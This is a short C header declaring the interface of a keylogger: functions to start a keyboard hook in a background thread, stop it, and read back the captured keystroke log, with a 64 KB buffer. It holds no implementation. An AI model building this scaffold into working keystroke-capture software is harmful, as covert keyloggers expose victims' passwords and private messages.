#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <stddef.h>

#define KEYLOG_BUFFER_SIZE (64 * 1024)

// Start the keylogger hook in a background thread.
// Returns 0 on success, -1 on failure.
int keylogger_start(void);

// Stop the keylogger and release resources.
void keylogger_stop(void);

// Copy up to buf_len bytes of the log into buf.
// Returns number of bytes written.
size_t keylogger_get_log(char *buf, size_t buf_len);

#endif
